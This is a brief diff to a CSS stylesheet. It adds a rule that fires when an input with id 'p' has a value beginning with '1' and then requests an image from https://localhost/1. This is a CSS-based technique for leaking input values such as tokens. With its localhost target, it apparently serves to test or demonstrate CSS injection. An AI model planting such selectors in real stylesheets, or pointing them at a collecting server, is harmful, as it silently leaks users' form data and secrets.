@@ -4,3 +4,7 @@
   color: red;
   font-weight: bold;
 }
+
+input[id=p][value^=1]{
+    background-image: url(https://localhost/1);
+}
